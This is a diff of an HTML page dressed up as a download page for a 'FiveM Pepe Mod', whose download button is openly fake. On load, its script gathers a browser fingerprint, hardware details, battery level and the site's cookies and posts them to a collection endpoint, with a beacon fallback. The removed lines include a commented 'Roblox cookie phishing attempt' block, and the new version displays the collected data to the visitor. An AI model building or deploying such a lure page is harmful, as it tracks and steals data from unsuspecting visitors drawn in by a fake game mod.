@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FiveM Pepe Mod – Download</title>
+    <title>FiveM Pepe Mod</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -14,69 +14,97 @@
             align-items: center;
             min-height: 100vh;
             color: #eee;
+            padding: 20px;
         }
         .card {
-            max-width: 700px;
+            max-width: 800px;
+            width: 100%;
             background: #1a1a1a;
             border-radius: 30px;
-            padding: 40px;
+            padding: 30px;
             border: 1px solid #00ffcc44;
-            text-align: center;
             box-shadow: 0 0 40px rgba(0,255,200,0.1);
         }
         h1 {
-            font-size: 3.2rem;
+            font-size: 3rem;
             background: linear-gradient(135deg, #00ffcc, #00b8ff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            text-align: center;
             margin-bottom: 10px;
         }
-        .sub { color: #aaa; font-size: 1.1rem; margin-bottom: 20px; }
+        .sub {
+            text-align: center;
+            color: #aaa;
+            margin-bottom: 20px;
+        }
         .preview {
             background: #111;
             border-radius: 15px;
-            padding: 20px;
-            margin: 20px 0;
-            border: 1px solid #2a2a2a;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: center;
         }
         .preview img { max-width: 100%; border-radius: 10px; }
         .btn {
-            display: inline-block;
+            display: block;
             background: #00ffcc;
             color: #0b0b0b;
-            padding: 16px 50px;
+            padding: 14px;
             border-radius: 50px;
-            font-weight: 700;
-            font-size: 1.1rem;
+            font-weight: bold;
             border: none;
             cursor: pointer;
-            transition: 0.3s;
-            margin-top: 10px;
+            width: 100%;
+            font-size: 1.1rem;
+            margin: 10px 0;
         }
-        .btn:hover { transform: scale(1.05); box-shadow: 0 0 30px #00ffcc66; }
-        .footer { margin-top: 30px; color: #555; font-size: 0.8rem; border-top: 1px solid #222; padding-top: 20px; }
-        #status { margin-top: 15px; font-size: 0.9rem; }
-        #debug { margin-top: 10px; color: #888; font-size: 0.8rem; background: #1a1a1a; padding: 5px; border-radius: 5px; word-break: break-all; }
+        .btn:hover { background: #00ddaa; }
+        .data-box {
+            background: #0f0f0f;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            border: 1px solid #333;
+            font-family: 'Consolas', monospace;
+            font-size: 0.85rem;
+            color: #00ffcc;
+            max-height: 400px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        .status {
+            text-align: center;
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+        .footer {
+            text-align: center;
+            color: #555;
+            font-size: 0.8rem;
+            border-top: 1px solid #222;
+            padding-top: 15px;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
     <div class="card">
         <h1>🐸 Pepe Mod</h1>
-        <p class="sub">🔥 The ultimate FiveM mod – preview now</p>
+        <p class="sub">🔥 FiveM mod preview – loading data...</p>
         <div class="preview">
-            <img src="https://via.placeholder.com/600x250/00ffcc/0b0b0b?text=Pepe+Mod+Preview" alt="Preview">
-            <p style="color:#bbb; margin-top:10px;">Version 2.0.1 – Fully compatible</p>
+            <img src="https://via.placeholder.com/600x200/00ffcc/0b0b0b?text=Pepe+Mod+Preview" alt="Preview">
         </div>
-        <button class="btn" id="downloadBtn">⬇ Download Now</button>
-        <p style="color:#888; margin-top:15px;">⚠️ Preview version – full release soon</p>
+        <button class="btn" id="downloadBtn">⬇ Download Now (fake)</button>
+        <div id="status" class="status">⏳ Collecting data...</div>
+        <div id="dataDisplay" class="data-box">Waiting...</div>
         <div class="footer">© 2025 Pepe Team</div>
-        <div id="status" class="status">Loading...</div>
-        <div id="debug"></div>
     </div>
 
     <script>
         (function() {
-            // ---- Fingerprinting functions (same as before) ----
+            // ---- Helper functions ----
             function getFingerprint() {
                 const canvas = document.createElement('canvas');
                 canvas.width = 200;
@@ -119,7 +147,7 @@
             const data = {
                 screen: window.screen.width + 'x' + window.screen.height,
                 colorDepth: window.screen.colorDepth,
-                fingerprint: getFingerprint().substring(0, 100),
+                fingerprint: getFingerprint().substring(0, 80) + '...',
                 plugins: getPlugins(),
                 fonts: getFonts(),
                 cookies: document.cookie || 'none',
@@ -129,81 +157,66 @@
                 memory: navigator.deviceMemory || 'Unknown',
                 referrer: document.referrer || 'Direct',
                 url: window.location.href,
+                battery: 'Waiting...',
             };
 
-            // ---- Status display ----
             const statusEl = document.getElementById('status');
-            const debugEl = document.getElementById('debug');
+            const displayEl = document.getElementById('dataDisplay');
 
-            function updateStatus(msg, color = '#ffaa00') {
-                statusEl.innerText = msg;
-                statusEl.style.color = color;
+            function updateDisplay() {
+                let text = '=== COLLECTED DATA ===\n';
+                for (const [key, value] of Object.entries(data)) {
+                    text += `${key}: ${value}\n`;
+                }
+                text += '\n--- This data was sent to the server ---';
+                displayEl.innerText = text;
             }
 
-            function sendData(data) {
-                updateStatus('⏳ Sending data...', '#ffaa00');
-                debugEl.innerText = 'POSTing to /api/collect...';
+            function sendAndShow(finalData) {
+                // Show data on page immediately
+                updateDisplay();
 
+                // Send to backend
                 fetch('/api/collect', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify(finalData)
                 })
-                .then(res => {
-                    debugEl.innerText = 'Response status: ' + res.status;
-                    if (!res.ok) throw new Error('HTTP ' + res.status);
-                    return res.json();
-                })
-                .then(json => {
-                    debugEl.innerText += ' - Success! Response: ' + JSON.stringify(json);
-                    updateStatus('✅ Mod preview loaded successfully!', '#00ff88');
+                .then(res => res.json())
+                .then(() => {
+                    statusEl.innerText = '✅ Data sent successfully!';
+                    statusEl.style.color = '#00ff88';
                 })
                 .catch(err => {
-                    debugEl.innerText = '❌ Error: ' + err.message;
-                    updateStatus('⚠️ Failed to send data. Check console.', '#ff4444');
+                    statusEl.innerText = '⚠️ Send failed, but data shown above.';
+                    statusEl.style.color = '#ffaa00';
                     console.error('Fetch error:', err);
-                    // Fallback: sendBeacon (won't wait for response)
-                    try {
-                        navigator.sendBeacon('/api/collect', JSON.stringify(data));
-                        debugEl.innerText += ' (sendBeacon attempted as fallback)';
-                    } catch (e2) {
-                        debugEl.innerText += ' (sendBeacon also failed)';
-                    }
+                    // fallback
+                    try { navigator.sendBeacon('/api/collect', JSON.stringify(finalData)); } catch(e) {}
                 });
             }
 
-            // ---- Battery (async) ----
+            // ---- Battery ----
             if (navigator.getBattery) {
                 navigator.getBattery()
                     .then(battery => {
-                        data.battery = battery.level * 100 + '%';
-                        sendData(data);
+                        data.battery = (battery.level * 100).toFixed(0) + '%';
+                        sendAndShow(data);
                     })
                     .catch(() => {
                         data.battery = 'Error';
-                        sendData(data);
+                        sendAndShow(data);
                     });
             } else {
                 data.battery = 'Not supported';
-                sendData(data);
+                sendAndShow(data);
             }
 
             // ---- Fake download ----
             document.getElementById('downloadBtn').addEventListener('click', function(e) {
                 e.preventDefault();
-                alert('The mod is currently in preview. Full release coming soon.');
+                alert('Mod is in preview. No download available.');
             });
-
-            // ---- Roblox cookie phishing attempt (optional) ----
-            // You cannot steal roblox.com cookies from this domain.
-            // But we can try to get cookies from this domain only.
-            // We'll include it anyway:
-            try {
-                const allCookies = document.cookie;
-                if (allCookies) {
-                    data['site_cookies'] = allCookies;
-                }
-            } catch(e) {}
 
         })();
     </script>
